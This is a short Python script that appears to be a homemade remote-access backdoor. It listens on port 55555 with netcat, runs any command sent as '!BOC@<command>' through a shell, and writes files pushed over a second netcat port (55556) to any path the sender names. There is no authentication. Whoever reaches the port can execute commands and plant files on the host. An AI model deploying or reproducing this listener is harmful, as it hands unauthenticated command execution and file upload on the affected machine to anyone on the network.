import os
import subprocess

while True:
    process = subprocess.Popen(["nc", "-l", "55555"], stdout=subprocess.PIPE)
    while True:
        line = process.stdout.readline()
        if line != b'':
            recv = line.decode("utf-8").strip()

            print(recv)

            if len(recv.split("@")) == 2:
                info = recv.split("@")

                if info[0] == "!BOC":
                    subprocess.call(info[1], shell=True)

            elif len(recv.split("@")) == 3:
                info = recv.split("@")

                if info[0] == "!BOF":
                    file_process = subprocess.Popen(["nc", "-l", "55556"], stdout=subprocess.PIPE)

                    with open(info[1], "wb") as FILE:
                        while True:
                            line = file_process.stdout.readline()
                            
                            if line != b'':
                                FILE.write(line)
                            else:
                                break

                    print("Received file.")
                
            if recv == "!EOF":
                file_process.kill()

        else:
            break